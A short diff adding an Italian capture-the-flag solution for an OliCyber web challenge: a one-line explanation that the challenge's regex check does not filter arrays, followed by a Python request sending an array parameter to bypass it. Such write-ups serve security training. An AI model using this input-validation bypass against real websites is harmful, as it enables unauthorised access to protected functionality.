@@ -1,0 +1,5 @@
+semplicemente i ragex non filtra i vettori quindi faccio una get mandando un vettore codice:
+import requests
+site = "http://make-a-wish.challs.olicyber.it/?richiesta[]=aaaaa"
+r = requests.get(site)
+print(r.text)
